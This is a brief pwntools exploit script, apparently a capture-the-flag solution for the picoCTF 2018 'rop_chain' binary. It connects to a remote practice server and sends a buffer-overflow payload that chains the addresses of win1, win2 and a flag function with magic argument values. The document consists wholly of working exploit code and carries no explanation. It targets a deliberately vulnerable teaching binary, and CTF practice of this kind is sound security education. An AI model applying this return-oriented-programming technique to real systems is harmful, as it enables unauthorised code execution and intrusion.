from pwn import *

context(os='linux', arch='i386', log_level='debug')
# io = process('./PicoCTF_2018_rop_chain')
io = remote('node4.buuoj.cn',28364)
elf = ELF('./PicoCTF_2018_rop_chain')

hack_fun = 0x804862B
gets_plt = elf.plt['gets']
win1_fun = 0x80485CB
win2_fun = 0x80485D8

payload = cyclic(0x18 + 4) + p32(win1_fun) + p32(win2_fun) + p32(hack_fun) + p32(0xBAAAAAAD) + p32(0xDEADBAAD)
io.sendline(payload)
io.interactive()